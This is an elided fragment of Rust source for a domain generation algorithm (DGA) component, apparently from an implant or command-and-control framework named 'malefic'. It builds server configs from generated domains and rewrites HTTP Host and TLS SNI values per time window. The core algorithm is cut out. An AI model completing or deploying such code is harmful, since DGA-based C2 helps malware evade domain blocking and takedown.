...
impl DgaGenerator {
    pub fn from_server_configs(server_configs: Vec<ServerConfig>) -> Result<Self, DgaError> {
        if server_configs.is_empty() {
            return Err(DgaError::NoDomains);
        }

        let dga_key = malefic_config::DGA_KEY.clone();
        let interval_hours = malefic_config::DGA_INTERVAL_HOURS.clone();

        let domains: Vec<String> = server_configs
            .iter()
        ...
        debug!(
            "[dga] Using domain suffixes from server configs: {:?}",
            domains
        );
    ...
    fn create_server_config(&self, domain: &DgaDomain, template: &ServerConfig) -> ServerConfig {
        ...
        if let malefic_config::TransportConfig::Http(ref mut http_config) = config.transport_config
        {
            http_config
                .headers
                .insert("Host".to_string(), domain.domain.clone());
            debug!("[dga] Updated HTTP Host header: {}", domain.domain);
        }

        debug!(
            "[dga] Created config: {} -> {} (SNI: {}, time window: {})",
            template.address,
            config.address,
            config
                .tls_config
